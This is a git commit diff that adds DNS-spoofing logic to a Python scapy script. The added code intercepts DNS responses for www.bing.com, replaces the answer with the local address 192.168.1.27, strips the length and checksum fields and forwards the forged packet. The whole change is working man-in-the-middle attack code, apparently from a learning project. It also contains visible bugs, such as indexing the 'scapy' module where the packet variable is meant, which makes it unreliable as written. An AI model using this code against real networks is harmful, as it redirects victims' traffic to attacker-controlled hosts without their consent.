a7db3dc47ed8a022b6951b7cd590dc0286b3934a
GenNiox <75768603+GenNiox@users.noreply.github.com>
2023-02-19 23:01:03 -0700

    Add files via upload

--- DNS_Spoofer/DNS_Spoofer.py
+++ DNS_Spoofer/DNS_Spoofer.py
@@ -22,8 +22,19 @@ def get_arguments():
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
-    print(scapy_packet.show())
-    # packet.accept()  # Forwards packets
+    if scapy_packet.haslayer(scapy.DNSRR):
+        qname = scapy_packet[scapy.DNSQR].qname
+        if "www.bing.com" in qname:
+            print("[+] Spoofing bing.com..")
+            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.27")
+            scapy[scapy.DNS].an = answer
+            scapy[scapy.DNS].ancount = 1
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.UDP].chksum
+            packet.set_payload(str(scapy_packet))
+    packet.accept()  # Forwards packets
     # packet.drop()  # Drops packets
 
 
